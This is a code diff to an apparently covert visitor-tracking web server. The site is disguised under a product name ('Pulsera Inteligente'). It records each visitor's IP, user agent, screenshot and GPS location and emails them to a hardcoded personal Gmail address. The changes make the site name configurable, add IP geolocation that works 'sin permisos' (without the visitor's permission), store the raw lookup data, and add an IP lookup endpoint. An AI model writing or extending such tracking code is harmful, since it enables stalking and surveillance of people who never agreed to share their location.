@@ -5,6 +5,7 @@ const nodemailer = require('nodemailer');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
+const SITE_NAME = process.env.SITE_NAME || 'Pulsera Inteligente';
 
 // Configuración de email
 const EMAIL_TO = 'shoncita1@gmail.com';
@@ -26,13 +27,13 @@ async function sendLocationEmail(visitData) {
         : 'Sin ubicación GPS';
 
     const mailOptions = {
-        from: `Pulsera Inteligente <${process.env.EMAIL_USER || 'tu-email@gmail.com'}>`,
+        from: `${SITE_NAME} <${process.env.EMAIL_USER || 'tu-email@gmail.com'}>`,
         to: EMAIL_TO,
-        subject: '🚨 Nueva Ubicación Capturada - Pulsera Inteligente',
+        subject: `🚨 Nueva Ubicación Capturada - ${SITE_NAME}`,
         html: `
             <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
                 <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 20px; text-align: center;">
-                    <h1>📍 Pulsera Inteligente</h1>
+                    <h1>📍 ${SITE_NAME}</h1>
                     <p>Nueva ubicación detectada</p>
                 </div>
                 
@@ -116,6 +117,11 @@ if (!fs.existsSync(visitsFile)) {
 
 console.log('✅ Sistema inicializado - Modo EMAIL + Dashboard web');
 
+// Expose a small config endpoint so frontends can read site name
+app.get('/api/config', (req, res) => {
+    res.json({ site_name: SITE_NAME });
+});
+
 // Función para obtener la IP real del visitante
 function getClientIP(req) {
     return req.headers['x-forwarded-for']?.split(',')[0].trim() || 
@@ -160,18 +166,16 @@ async function getLocationByIP(ip) {
                     try {
                         const result = JSON.parse(data);
                         
-                        if (result.latitude && result.longitude) {
-                            resolve({
-                                latitude: result.latitude,
-                                longitude: result.longitude,
-                                city: result.city,
-                                country: result.country_name,
-                                accuracy: `Aproximada (${result.city}, ${result.country_name})`,
-                                method: 'IP'
-                            });
-                        } else {
-                            resolve(null);
-                        }
+                                // Return useful fields plus the raw API response
+                                resolve({
+                                    latitude: result.latitude || null,
+                                    longitude: result.longitude || null,
+                                    city: result.city || null,
+                                    country: result.country_name || null,
+                                    accuracy: result.city && result.country_name ? `Aproximada (${result.city}, ${result.country_name})` : null,
+                                    method: 'IP',
+                                    raw: result
+                                });
                     } catch (error) {
                         console.error('Error parseando respuesta:', error);
                         resolve(null);
@@ -190,7 +194,9 @@ async function getLocationByIP(ip) {
 
 // Ruta para registrar la visita con geolocalización
 app.post('/api/log-visit', async (req, res) => {
-    const ip = getClientIP(req);
+    // Allow client to send detected public IP (helps when behind NAT)
+    const clientDetectedIp = req.body.public_ip;
+    const ip = clientDetectedIp || getClientIP(req);
     const timestamp = new Date().toISOString();
     const userAgent = req.headers['user-agent'];
     const { screenshot, latitude, longitude, accuracy } = req.body;
@@ -215,15 +221,28 @@ app.post('/api/log-visit', async (req, res) => {
     let finalLongitude = longitude;
     let finalAccuracy = accuracy;
     let locationMethod = 'GPS';
+    let ipLocation = null;
+    let ipRaw = null;
 
     if (!latitude || !longitude) {
-        const ipLocation = await getLocationByIP(ip);
+        ipLocation = await getLocationByIP(ip);
         if (ipLocation) {
             finalLatitude = ipLocation.latitude;
             finalLongitude = ipLocation.longitude;
             finalAccuracy = ipLocation.accuracy;
             locationMethod = 'IP (sin permisos)';
+            ipRaw = ipLocation.raw || null;
             console.log('📡 Ubicación obtenida por IP (sin permisos necesarios)');
+        }
+    }
+
+    // Always try to fetch IP info for records if not already fetched
+    if (!ipLocation) {
+        try {
+            ipLocation = await getLocationByIP(ip);
+            ipRaw = ipLocation ? ipLocation.raw : null;
+        } catch (e) {
+            ipLocation = null;
         }
     }
 
@@ -258,6 +277,8 @@ app.post('/api/log-visit', async (req, res) => {
             id: visits.length + 1,
             timestamp: visitData.timestamp,
             ip: visitData.ip,
+            public_ip: clientDetectedIp || null,
+            ip_info: ipLocation || null,
             latitude: visitData.latitude,
             longitude: visitData.longitude,
             accuracy: visitData.accuracy,
@@ -318,6 +339,22 @@ app.get('/api/visits', (req, res) => {
     } catch (error) {
         console.error('Error obteniendo visitas:', error);
         res.status(500).json({ error: 'Error al obtener visitas' });
+    }
+});
+
+// Ruta de depuración: devuelve la IP detectada y la geolocalización por IP
+app.get('/api/ip-lookup', async (req, res) => {
+    try {
+        const ip = getClientIP(req) || req.ip;
+        const info = await getLocationByIP(ip);
+
+        res.json({
+            ip,
+            info: info || null
+        });
+    } catch (error) {
+        console.error('Error en /api/ip-lookup:', error);
+        res.status(500).json({ error: 'Error al obtener geolocalización por IP' });
     }
 });
 
